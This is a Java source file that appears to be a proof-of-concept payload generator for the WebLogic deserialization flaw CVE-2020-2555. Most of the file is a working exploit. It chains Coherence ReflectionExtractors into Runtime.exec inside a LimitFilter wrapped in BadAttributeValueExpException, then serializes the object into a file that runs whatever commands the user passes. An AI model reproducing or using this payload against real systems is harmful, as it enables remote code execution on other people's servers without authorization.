package com.scan.weblogic.poc;

import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class WeblogicCVE20202555 {

    private static byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.flush();
        objOut.close();
        return out.toByteArray();
    }

    public static byte[] makePayload(String[] cmds) throws Exception {

        // Runtime.class.getRuntime()
        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getMethod",
                new Object[]{"getRuntime", new Class[0]}
        );

        // get invoke() to execute exec()
        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "invoke",
                new Object[]{null, new Object[0]}
        );

        // invoke("exec","calc")
        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "exec",
                new Object[]{cmds}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        // serialize

        byte[] payload = serialize(badAttributeValueExpException);

        return payload;
    }

    public static void main(String[] args) throws Exception {

        if(args.length<2){
            System.out.println("Usage:Main <payload file> <cmds>");
            System.exit(-1);
        }

        String payloadFile = args[0];
        String[] cmds = args[1].split(",");


        byte[] data = makePayload(cmds);

        Files.write(Paths.get(payloadFile),data);

        System.out.println("Make payload and write to file:"+payloadFile);

    }

}